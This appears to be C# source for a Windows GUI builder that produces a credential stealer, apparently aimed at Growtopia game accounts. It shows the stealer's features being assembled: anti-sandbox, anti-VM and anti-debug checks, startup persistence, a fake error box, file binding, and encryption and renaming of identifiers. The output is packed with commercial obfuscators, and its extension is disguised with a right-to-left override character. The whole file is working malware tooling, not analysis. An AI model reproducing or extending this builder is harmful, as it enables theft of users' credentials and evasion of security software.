using System;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using Microsoft.Win32;
using RegFileParser;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Text;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Vestris.ResourceLib;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Timers;

namespace AAPBuilder
{
    public partial class MainForm : Form
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        public MainForm()
        {
            timer.Elapsed += new ElapsedEventHandler(SearchProcess);
            timer.Interval = 15000;
            timer.Enabled = true;
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string resourceName = new AssemblyName(args.Name).Name + ".dll";
                string resource = Array.Find(Assembly.GetExecutingAssembly().GetManifestResourceNames(), element => element.EndsWith(resourceName));
                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))
                {
                    Byte[] assemblyData = new Byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    return Assembly.Load(assemblyData);
                }
            };
            InitializeComponent();
            hexEditor = new HexEditor(new RegFixer(RegFixerOutput), this);
        }

        private void ProtectStealer(string dropPath)
        {
            try
            {
                statusString = "   Protecting...";
                List<string> failureBuffer = new List<string>();
                if (File.Exists(reactorPath) && File.Exists(reactorProjectPath))
                {
                    Process proc = new Process();
                    proc.StartInfo.FileName = reactorPath;
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.StartInfo.Arguments = $@"-file ""{dropPath}"" -project ""{reactorProjectPath}"" -targetfile ""{dropPath}"" -q";
                    proc.Start();
                    proc.WaitForExit();
                }
                else failureBuffer.Add(".NET Reactor");

                if (File.Exists(smartAssemblyCom) && File.Exists(smartAssemblyProject))
                {
                    Process proc1 = new Process();
                    proc1.StartInfo.FileName = smartAssemblyCom;
                    proc1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc1.StartInfo.Arguments = $@"""{smartAssemblyProject}"" /input=""{dropPath}"" /output=""{dropPath}""";
                    proc1.Start();
                    proc1.WaitForExit();
                }
                else failureBuffer.Add($@"SmartAssembly");

                if (isPowerfull.Checked)
                {
                    if (File.Exists(themida) && File.Exists(themidaProject))
                    {
                        Process proc2 = new Process();
                        proc2.StartInfo.FileName = themida;
                        proc2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        proc2.StartInfo.Arguments = $@"/protect ""{themidaProject}"" /inputfile ""{dropPath}"" /outputfile ""{dropPath}""";
                        proc2.Start();
                        proc2.WaitForExit();
                    }
                    else failureBuffer.Add("Themida Protector");
                }
                if (failureBuffer.Count > 0)
                {
                    MessageBox.Show("Listed dependencies are missing or corrupted. Please reinstall the application;\n" + String.Join("\n", failureBuffer.ToArray()), "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            catch { }
            finally
            {
                if (File.Exists(dropPath + ".hash")) File.Delete(dropPath + ".hash");
                if (File.Exists(dropPath + ".log")) File.Delete(dropPath + ".log");
                if (File.Exists(dropPath.Replace(".exe", ".bak"))) File.Delete(dropPath.Replace(".exe", ".bak"));
            }
        }

        private static string currentPath { get { return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location); } }
        private static string protectionFolderPath = Path.Combine(currentPath, "ProtectionDependecies");
        private string reactorProjectPath = Path.Combine(protectionFolderPath, @"Reactor\reactorProject.nrproj");
        private string reactorPath = Path.Combine(protectionFolderPath, @"Reactor\dotNET_Reactor.exe");
        private string smartAssemblyProject = Path.Combine(protectionFolderPath, @"SmartAssembly\sAssemblyProject.saproj");
        private string smartAssembly = Path.Combine(protectionFolderPath, @"SmartAssembly\SmartAssembly.exe");
        private string smartAssemblyCom = Path.Combine(protectionFolderPath, @"SmartAssembly\SmartAssembly.com");
        private string themida = Path.Combine(protectionFolderPath, @"Themida\Themida.exe");
        private string themidaProject = Path.Combine(protectionFolderPath, @"Themida\tmdProject.tmd");

        private bool PumpBytes(string path, long value)
        {
            try
            {
                statusString = "    Pumping...";
                long filesize = value * (kbRb.Checked ? 1024 : 1048576);
                FileStream fs = new FileStream(path, FileMode.Append, FileAccess.Write);
                byte[] buffer = new byte[filesize];
                if (ınfluenceCheckBox7.Checked)
                {
                    Random rand = new Random(Guid.NewGuid().GetHashCode());
                    rand.NextBytes(buffer);
                }
                fs.Write(buffer, 0, (int)filesize);
                fs.Close();
                return true;
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        private bool needsAdmin { get { return (ınfluenceCheckBox2.Checked ? (rbSystem.Checked || rbProgramFiles.Checked) : false); } set { } }
        private void CompileCode(string fullPath1)
        {
            string fullPath = "";
            fullPath = fullPath1;
            statusString = "    Building...";
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            parameters.CompilerOptions = "/target:winexe";
            string fname = Path.GetFileName(fullPath);
            bool created = false;
            string tempPath = Path.Combine(Path.GetTempPath(), $@"{fname}.manifest");
            if (needsAdmin) { File.WriteAllText(tempPath, Properties.Resources.manifestCode); parameters.CompilerOptions += $@" /win32manifest:""{tempPath}"""; created = true; }
            if (File.Exists(textBox22.Text)) parameters.CompilerOptions += $@" /win32icon:""{textBox22.Text}""";
            if (File.Exists(textBox21.Text)) parameters.EmbeddedResources.Add(textBox21.Text);
            parameters.OutputAssembly = fullPath;
            string code = GetReplacedCode();
            if (code == "") return;
            else if (code == null)
            {
                System.Windows.Forms.MessageBox.Show("Your registry data returned null, in order to complete building and create registry data, you have to connect to the Growtopia once and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            try
            {
                var results = provider.CompileAssemblyFromSource(parameters, code);
                string errors = "";
                if (results.Errors.HasErrors)
                {
                    foreach (CompilerError err in results.Errors) { errors += "\n" + err.ErrorText + " | " + err.Line; }
                    System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    ProtectStealer(fullPath);
                    if (backupR.Checked) CreateBackupFile(fullPath, GetHexValues());
                    if (influenceCheckBox3.Checked && File.Exists(textBox13.Text) && File.Exists(textBox19.Text)) fullPath = SpoofExtension(fullPath, textBox19.Text);
                    if (ınfluenceCheckBox13.Checked) SetAssemblyInfos(fullPath);
                    if (influenceCheckBox1.Checked)
                    {
                        if (new Regex(@"^[0-9]+$").IsMatch(textBox24.Text))
                        {
                            int x = 0;
                            if (Int32.TryParse(textBox24.Text, out x))
                            {
                                if (x != 0) PumpBytes(fullPath, (long)x);
                            }
                        }
                    }
                    abortationFlag = true;
                    System.Windows.Forms.MessageBox.Show($"Successfully built stealer!\nSaved to: '{fullPath}'\n", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                if (created) if (File.Exists(tempPath)) File.Delete(tempPath);
            }
        }

        private string SpoofExtension(string fullPath, string extension)
        {
            statusString = "    Spoofing...";
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            parameters.CompilerOptions = "/target:winexe";
            if (File.Exists(textBox19.Text)) parameters.CompilerOptions += $@" /win32icon:""{textBox19.Text}"""; ;
            parameters.EmbeddedResources.Add(fullPath);
            parameters.EmbeddedResources.Add(textBox13.Text);
            parameters.OutputAssembly = fullPath;
            string code = Properties.Resources.Code2.Replace("[Assembly-File1]", Path.GetFileName(fullPath)).Replace("[Assembly-File2]", Path.GetFileName(textBox13.Text));
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            string errors = "";
            if (results.Errors.HasErrors)
            {
                foreach (CompilerError err in results.Errors) { errors += "\n" + err.ErrorText + " | " + err.Line; }
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return fullPath;
            }
            else return ChangeExtension(fullPath);
        }

        private string ChangeExtension(string file)
        {
            try
            {
                string spoofed = file.Replace(".exe", ".scr");
                int num = spoofed.Length - 4;
                char ch = '\x202E';
                char[] charArray = Path.GetExtension(textBox13.Text).Replace(".", "").ToCharArray();
                Array.Reverse(charArray);
                string destFileName = spoofed.Substring(0, num) + ch + new string(charArray) + spoofed.Substring(num);
                if (File.Exists(destFileName)) File.Delete(destFileName);
                File.Move(file, destFileName);
                return destFileName;
            }
            catch (Exception ex)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{ex.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return file;
            }
        }

        private void SetAssemblyInfos(string outpath)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(outpath);
                versionResource.Language = 0;

                versionResource.ProductVersion = $@"{influenceNumericUpDown1.Value.ToString()}.{influenceNumericUpDown2.Value.ToString()}.{influenceNumericUpDown3.Value.ToString()}.{influenceNumericUpDown4.Value.ToString()}";
                versionResource.FileVersion = $@"{influenceNumericUpDown8.Value.ToString()}.{influenceNumericUpDown7.Value.ToString()}.{influenceNumericUpDown6.Value.ToString()}.{influenceNumericUpDown5.Value.ToString()}";


                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                if (textBox15.Text != "") stringFileInfo["CompanyName"] = textBox15.Text;
                if (textBox14.Text != "") stringFileInfo["FileDescription"] = textBox14.Text;
                if (textBox12.Text != "") stringFileInfo["ProductName"] = textBox12.Text;
                if (textBox17.Text != "") stringFileInfo["LegalCopyright"] = textBox17.Text;
                if (textBox18.Text != "") stringFileInfo["LegalTrademarks"] = textBox18.Text;

                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["InternalName"] = textBox16.Text;
                stringFileInfo["OriginalFilename"] = textBox16.Text;
                versionResource.SaveTo(outpath);
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static string[] GetHexValues()
        {
            string[] values = new string[14] { "", "", "", "", "", "", "", "", "", "", "", "", "", "" };
            RegistryKey Key = Registry.CurrentUser;
            string[] knames = Key.GetSubKeyNames();
            int x = 0;
            for (int i = 0; i < knames.Length; i++)
            {
                if (Int32.TryParse(knames[i], out x))
                {
                    Key = Key.OpenSubKey(knames[i]);
                    string[] valnames = Key.GetValueNames();
                    if (valnames.Length > 0)
                    {
                        values[0] = knames[i];
                        values[1] = valnames[0];
                        values[2] = BitConverter.ToString((byte[])Key.GetValue(valnames[0])).Replace("-", ",").ToLower();
                        values[3] = valnames[1];
                        values[4] = BitConverter.ToString((byte[])Key.GetValue(valnames[1])).Replace("-", ",").ToLower();
                        break;
                    }
                }
            }

            Key.Close();
            Key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft", false);
            knames = Key.GetSubKeyNames();
            for (int i = 0; i < knames.Length; i++)
            {
                if (Int32.TryParse(knames[i], out x))
                {
                    Key = Key.OpenSubKey(knames[i]);
                    string[] valnames = Key.GetValueNames();
                    if (valnames.Length > 0)
                    {
                        values[5] = knames[i];
                        values[6] = valnames[0];
                        values[7] = BitConverter.ToString((byte[])Key.GetValue(valnames[0])).Replace("-", ",").ToLower();
                        values[8] = valnames[1];
                        values[9] = BitConverter.ToString((byte[])Key.GetValue(valnames[1])).Replace("-", ",").ToLower();
                        values[10] = valnames[2];
                        values[11] = BitConverter.ToString((byte[])Key.GetValue(valnames[2])).Replace("-", ",").ToLower();
                        values[12] = valnames[3];
                        values[13] = BitConverter.ToString((byte[])Key.GetValue(valnames[3])).Replace("-", ",").ToLower();
                    }
                }
            }

            return values;
        }

        private static string GetGuid()
        {
            try
            {
                return Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography", false).GetValue("MachineGuid", "").ToString();
            }
            catch (Exception) { return ""; }
        }

        private void CreateBackupFile(string path, string[] HexValues)
        {
            try
            {
                string regstr = string.Format(@"Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\{0}]
""{1}""=hex:{2}
""{3}""=hex:{4}

[HKEY_CURRENT_USER\Software\Microsoft\{5}]
""{6}""=hex:{7}
""{8}""=hex:{9}
""{10}""=hex:{11}
""{12}""=hex:{13}

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography]
""MachineGuid""=""{14}""", HexValues[0], HexValues[1], HexValues[2], HexValues[3], HexValues[4], HexValues[5], HexValues[6], HexValues[7], HexValues[8], HexValues[9], HexValues[10], HexValues[11], HexValues[12], HexValues[13], GetGuid());
                File.WriteAllText(path.Replace(".exe", ".reg"), regstr);
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool wow64Process);
        public static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
            {
                using (Process p = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(p.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else return false;
        }

        private static string[] identifierNames { get; set; } = { "by5t4_b5f", "bu3lls5hit", "fsdfgsdfjgdghdfj", "odfajgfdjgjdf24", "khgkjgdfjfd22", "jkfldgkdfsgfdsgfds", "gfdsgfdsgdfsgfsd", "fgsgfs32gfdasgfsd", "k_e_4y", "g43533353646", "o43423434343", "kf4d65a45fd6sa4df5a", "ukfdkfsdffduuut", "saltBytes", "subbedPwd", "d4ne", "is5encr4ypto", "doStuf_f2", "cryptoStream", "me5mo4rSyream", "dS4_2tr", "A_E_S", "passwordBytes", "bytesToBeDecrypted", "isEncrypted", "sa_4lt", "passw_2ord", "in_p5ut", "hexValues_", "hwi0_d_", "GenerateReplacedString", "off2s0t", "th2ngie4", "decodedT0hing_", "DecodeSave", "pwkld", "ValidateChar", "cdzdshr", "hezap", "truePwd", "passindex2", "passoffset", "realpassindex", "stri0ngB9uffer", "growkid", "pa_dth", "buff7er", "strin_g0Builder", "decodedPwds", "conten0t_", "array2", "typeArguments", "argumentNames", "argument_s", "arra_y_", "memberName", "typ_e", "instance_", "sendMac", "receiver_", "regStr_", "fil_e", "macInf0_", "GrabMacAddress", "stdOut_put", "pro_c_", "SendMail", "retVal", "pr_sc", "InternalCheckIsWow64", "xref", "Key_", "values", "GetHexValues", "inMemory", "ExtractSaveResource", "mngObject", "Check4VM", "AntiDebug", "Check4SB", "basePath", "strBuilder_", "obj_", "input", "registryKey", "Keyname", "doStuff", "ZeroOnly", "lpClassName", "sb", "lpFileName", "procedureName", "hModule", "lpModuleName", "array2", "array_", "regEntry", "contentType", "mailMessage", "reg_str", "Server_", "Values_", "file_", "Hwid", "SystemForm", "RunPE1", "Hand4leRun", "R4un", "str3eam", "pat7h", "buffer", "b5uffer", "ProcessHandle", "ThreadHandle", "ProcessId", "ThreadId", "Reserved1", "Desktop", "Title", "Reserved2", "StdInput", "StdOutput", "StdError", "readWrite", "quotedPath", "fileAddress", "imageBase", "context", "ebx", "baseAddress", "sizeOfImage", "sizeOfHeaders", "allowOverride", "newImageBase", "sectionOffset", "numberOfSections", "virtualAddress", "sizeOfRawData", "pointerToRawData", "sectionData", "pointerData", "addressOfEntryPoint", "args", "bytes", "filename", "applicationName", "commandLine", "processAttributes", "threadAttributes", "inheritHandles", "creationFlags", "environment", "currentDirectory", "processInformation", "thread", "context", "thread", "thread", "prc", "prcss", "baseAddress", "buffer", "bufferSize", "bytesRead", "process", "baseAddress", "bufferSize", "bytesWritten", "process", "baseAddress", "handle", "address", "length", "protect", "path", "data", "compatible" };

        private static List<string> cryptoIdentifiers = new List<string>();
        private string GetReplacedCode()
        {
            try
            {
                string[] HexValues = GetHexValues();
                string text = Properties.Resources.Code;
                text = text.Replace("Place_for_Address", textBox1.Text).Replace("Place_for_Password", textBox4.Text).Replace("[Server]", textBox8.Text).Replace("[Port]", textBox6.Text);
                cryptoIdentifiers.Add(textBox1.Text);
                cryptoIdentifiers.Add(textBox4.Text);
                if (aDecode.Checked) text = text.Replace("[AutoDecode]", "true");
                else text = text.Replace("[AutoDecode]", "false");
                if (receiverManager.receiverList.Length != 0) for (int i = 0; i < receiverManager.receiverList.Length; i++) { text = text.Replace($"//[SenderObject{i}]", "").Replace($"[Receiver{i}]", receiverManager.receiverList[i]); cryptoIdentifiers.Add(receiverManager.receiverList[i]); }
                if (antiSB.Checked) text = text.Replace("//[AntiSB]", "");
                if (antiVM.Checked) text = text.Replace("//[AntiVM]", "");
                if (antiDB.Checked) text = text.Replace("//[AntiDB]", "");
                if (HexValues == null) return null;
                text = text.Replace("Number1", HexValues[0]).Replace("Number2", HexValues[1]).Replace("Number3", HexValues[3]).Replace("Number4", HexValues[5]).Replace("Number5", HexValues[6]).Replace("Number6", HexValues[8]).Replace("Number7", HexValues[10]).Replace("Number8", HexValues[12]);
                string dropPath = (rbTemp.Checked ? "Path.GetTempPath()" : (rbAppdata.Checked ? @"Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @""\""" : (rbSystem.Checked ? @"(Environment.Is64BitOperatingSystem ? Environment.GetFolderPath(Environment.SpecialFolder.SystemX86).Replace(""WINDOWS"", ""Windows"") + @""\"" : Environment.GetFolderPath(Environment.SpecialFolder.System).Replace(""WINDOWS"", ""Windows"") + @""\"")" : (rbProgramFiles.Checked ? @"Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @""\""" : "Path.GetTempPath()"))));
                if (ınfluenceCheckBox2.Checked) text = text.Replace("//[Startup]", "").Replace("[Startup-File]", textBox20.Text.EndsWith(".exe") || textBox20.Text.EndsWith(".EXE") ? textBox20.Text : textBox20.Text += ".exe").Replace("[Startup-Key]", textBox9.Text).Replace("[Startup - Path_]", dropPath);
                else text = text.Replace("[Check - Startup]", "false").Replace("[Startup - Path_]", "null");

                //if (ınfluenceCheckBox2.Checked) text = text.Replace("[Check - Startup]", "true").Replace("//[Startup]", "").Replace("[Startup-File]", textBox20.Text.EndsWith(".exe") || textBox20.Text.EndsWith(".EXE") ? textBox20.Text : textBox20.Text += ".exe").Replace("[Startup-Key]", textBox9.Text).Replace("[Startup - Path_]", dropPath);
                //else text = text.Replace("[Check - Startup]", "false").Replace("[Startup - Path_]", "null");
                if (ınfluenceCheckBox2.Checked && ınfluenceCheckBox3.Checked) text = text.Replace("//[Hide-File]", "");
                if (ınfluenceCheckBox1.Checked) text = text.Replace("//[FakeMessageBox]", "").Replace("[FakeContent]", textBox10.Text).Replace("[FakeTi5tle]", textBox11.Text).Replace("FakeIcon", rbNone.Checked ? "MessageBoxIcon.None" : (rbInformation.Checked ? "MessageBoxIcon.Information" : (rbError.Checked ? "MessageBoxIcon.Error" : (rbWarning.Checked ? "MessageBoxIcon.Warning" : (rbQuestion.Checked ? "MessageBoxIcon.Question" : "MessageBoxIcon.None"))))).Replace("MessageBoxButtons.OK", (rbQuestion.Checked ? "MessageBoxButtons.YesNo" : "MessageBoxButtons.OK"));
                if (File.Exists(textBox21.Text))
                {
                    if (bunifuiOSSwitch1.Value) text = text.Replace("//[File-Binder]", "").Replace("[Binded-Name]", Path.GetFileName(textBox21.Text)).Replace("[isMemory]", "true");
                    else text = text.Replace("//[File-Binder]", "").Replace("String.Empty", $@"Path.Combine(Path.GetTempPath(), ""{Path.GetFileName(textBox21.Text)}"")").Replace("[Binded-Name]", Path.GetFileName(textBox21.Text)).Replace("[isMemory]", "false");
                }
                if (isEncryption.Checked)
                {
                    text = text.Replace("[isEncrypto]", "true");
                    string salt = Randomizer.RandomString(8, false);
                    text = text.Replace("SALT_STR", salt);
                    foreach (string identifier in cryptoIdentifiers.ToArray())
                    {
                        while (true)
                        {
                            string encryptedStr = EncryptString(identifier, salt, 30);
                            if (DecryptString(encryptedStr, true, salt) == identifier)
                            {
                                text = text.Replace(identifier, encryptedStr);
                                break;
                            }
                        }
                    }
                }
                else text = text.Replace("[isEncrypto]", "false");
                if (enabledUSG.Checked) foreach (var item in identifierNames) text = text.Replace(item, Randomizer.RandomString(500, identifierNames));
                cryptoIdentifiers.Clear();
                return text;
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return "";
            }
        }

        private static string DecryptString(string in_p5ut, bool is5encr4ypto, string salt)
        {
            if (!is5encr4ypto) return in_p5ut;
            bool d4ne = false;
            for (int i = 0; i < in_p5ut.Length; i++)
            {
                try
                {
                    if (d4ne) break;
                    string subbedPwd = in_p5ut.Substring(i, 5 + 1 + 2 + 6 + 4 + 2 + 2 + 7 + 1);
                    if (in_p5ut.EndsWith(subbedPwd)) d4ne = true;
                    byte[] bytesToBeDecrypted = Convert.FromBase64String(in_p5ut.Remove(in_p5ut.IndexOf(subbedPwd), subbedPwd.Length));
                    byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(subbedPwd));
                    byte[] saltBytes = Encoding.ASCII.GetBytes(salt);
                    MemoryStream me5mo4rSyream = new MemoryStream();
                    RijndaelManaged A_E_S = new RijndaelManaged();
                    A_E_S.KeySize = 256;
                    A_E_S.BlockSize = 128;
                    var k_e_4y = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    A_E_S.Key = k_e_4y.GetBytes(A_E_S.KeySize / 8);
                    A_E_S.IV = k_e_4y.GetBytes(A_E_S.BlockSize / 8);
                    A_E_S.Mode = CipherMode.CBC;
                    var cryptoStream = new CryptoStream(me5mo4rSyream, A_E_S.CreateDecryptor(), CryptoStreamMode.Write);
                    cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cryptoStream.Close();
                    byte[] by5t4_b5f = me5mo4rSyream.ToArray();
                    string dS4_2tr = Encoding.ASCII.GetString(by5t4_b5f);
                    for (int bu3lls5hit = 0; bu3lls5hit < by5t4_b5f.Length; bu3lls5hit++) if (by5t4_b5f[bu3lls5hit].ToString("X2") == "3F") continue;
                    if (dS4_2tr.Contains("?")) continue;
                    return dS4_2tr;
                }
                catch (CryptographicException) { continue; }
            }
            return null;
        }

        private static string DecryptString(string input, string salt)
        {
            if (String.IsNullOrEmpty(salt) || String.IsNullOrEmpty(input)) return "";
            foreach (string password in RetreiveKeys(input))
            {
                try
                {
                    byte[] bytesToBeDecrypted = Convert.FromBase64String(input.Remove(input.IndexOf(password), password.Length));
                    byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
                    byte[] saltBytes = Encoding.ASCII.GetBytes(salt);
                    MemoryStream memoryStream = new MemoryStream();
                    RijndaelManaged AES = new RijndaelManaged();
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    var cryptoStream = new CryptoStream(memoryStream, AES.CreateDecryptor(), CryptoStreamMode.Write);
                    cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cryptoStream.Close();
                    string dStr = Encoding.ASCII.GetString(memoryStream.ToArray());
                    if (Base64Decode(dStr).Contains("?") || !ValidateHex(Base64Decode(dStr))) continue;
                    return dStr;
                }
                catch (CryptographicException) { continue; }
            }
            return null;
        }

        private static bool ValidateHex(string dStr)
        {
            byte[] buffer = Encoding.ASCII.GetBytes(dStr);
            for (int i = 0; i < buffer.Length; i++)
            {
                if (buffer[i].ToString("X2") == "3F") return false;
            }
            return true;
        }

        private static string[] RetreiveKeys(string encryptedString)
        {
            List<string> stringList = new List<string>();
            int offset = 20;
            for (int i = 0; i < encryptedString.Length; i++)
            {
                string subbedPwd = encryptedString.Substring(i, offset);
                stringList.Add(subbedPwd);
                if (encryptedString.EndsWith(subbedPwd)) break;
            }
            return stringList.ToArray();
        }

        private static string EncryptString(string input, string salt, int pwdLenght = 20)
        {
            try
            {
                string password = Randomizer.RandomString(pwdLenght, false);
                int passwordOffset = new Random(Guid.NewGuid().GetHashCode()).Next(0, input.Length);
                byte[] bytesToBeEncrypted = Encoding.UTF8.GetBytes(input);
                byte[] passwordHash = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
                byte[] saltBytes = Encoding.ASCII.GetBytes(salt);
                MemoryStream memoryStream = new MemoryStream();
                RijndaelManaged AES = new RijndaelManaged();
                AES.KeySize = 256;
                AES.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordHash, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);
                AES.Mode = CipherMode.CBC;
                var cryptoStream = new CryptoStream(memoryStream, AES.CreateEncryptor(), CryptoStreamMode.Write);
                cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                cryptoStream.Close();
                return Convert.ToBase64String(memoryStream.ToArray()).Insert(passwordOffset, password);
            }
            catch (Exception)
            {
                return "";
            }
        }

        private bool abortationFlag { get; set; } = false;

        private void ınfluenceButton4_Click(object sender, EventArgs e)
        {
            try
            {
                if (textBox1.Text == "" || textBox4.Text == "") return;
                if (Check4SB())
                {
                    if (MessageBox.Show("This program might not work properly in a sandbox environment. Continue anyway?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1) == DialogResult.No) return;
                }
                int x = 0;
                if (!Int32.TryParse(textBox6.Text, out x)) { System.Windows.Forms.MessageBox.Show("Invalid Port", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); return; }
                saveFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string fpath = saveFileDialog1.ShowDialog() == DialogResult.OK ? saveFileDialog1.FileName : null;
                if (fpath == null) return;
                Thread worker = new Thread(() => StartAnimation(new Thread(() => CompileCode(fpath))));
                if (textBox1.Text != "" || textBox4.Text != "")
                {
                    ınfluenceButton4.Enabled = false;
                    worker.Start();
                }
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string statusString = "    Building...";
        private void StartAnimation(Thread builder)
        {
            try
            {
                builder.Start();
                Cursor.Current = Cursors.WaitCursor;
                while (builder.IsAlive && !abortationFlag)
                {
                    ınfluenceButton4.Text = $@"{statusString}/";
                    Thread.Sleep(500);
                    ınfluenceButton4.Text = $@"{statusString}-";
                    Thread.Sleep(500);
                    ınfluenceButton4.Text = $@"{statusString}\";
                    Thread.Sleep(500);
                    ınfluenceButton4.Text = $@"{statusString}|";
                    Thread.Sleep(500);
                }
                Cursor.Current = Cursors.Default;
                ınfluenceButton4.Text = @"        Build";
                abortationFlag = false;
                ınfluenceButton4.Enabled = true;
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }


        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetUserName(StringBuilder sb, ref int length);
        public static bool Check4SB() // stolen from somewhere
        {
            try
            {
                StringBuilder strBuilder_ = new StringBuilder();
                Process[] prcss = Process.GetProcesses();
                string basePath = Assembly.GetExecutingAssembly().Location.ToUpper();
                int length = 50;
                GetUserName(strBuilder_, ref length);
                if ((int)GetModuleHandle("SbieDLL.dll") != 0) return true;
                else if (strBuilder_.ToString().ToUpper().Contains("VIRUS") || strBuilder_.ToString().ToUpper().Contains("SCHMIDTI") || (strBuilder_.ToString().ToUpper().Contains("MALWARE") || strBuilder_.ToString().ToUpper().Contains("SANDBOX")) || strBuilder_.ToString().ToUpper() == "CURRENTUSER" || strBuilder_.ToString().ToUpper() == "USER") return true;
                else
                {
                    foreach (Process prc in prcss) { if (prc.ProcessName.ToUpper().Contains("SANDBOXIE")) return true; }
